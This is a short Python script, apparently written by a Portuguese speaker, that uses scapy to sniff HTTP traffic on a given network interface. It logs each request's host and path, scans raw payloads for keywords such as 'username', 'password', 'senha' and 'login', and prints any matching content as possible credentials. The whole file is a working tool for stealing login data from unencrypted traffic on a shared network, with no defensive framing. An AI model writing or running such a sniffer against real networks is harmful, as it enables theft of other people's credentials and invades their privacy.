import scapy.all as scapy
from scapy.layers import http
import argparse

def pegar_informacoes():
    parser = argparse.ArgumentParser()
    parser.add_argument("--i", "-interface", dest="interface")

    argumentos = parser.parse_args()
    return argumentos.interface



def sniffing(interface):
    scapy.sniff(iface=interface, store=False, prn=processar_pacote)

def processar_pacote(pacote):
    if pacote.haslayer(http.HTTPRequest):
        
        print("Requisicao: " + str(pacote[http.HTTPRequest].Host) + str(pacote[http.HTTPRequest].Path))

        if pacote.haslayer(scapy.Raw):
            conteudo = str(pacote[scapy.Raw].load)

            palavras_de_interesse = ["username", "user", "pass", "password", "email", "senha", "usuario", "login"]

            for palavra in palavras_de_interesse:
                if palavra in conteudo:
                    print("Possivel usuario e senha: " + str(conteudo))
                    break


interface = pegar_informacoes()
sniffing(interface)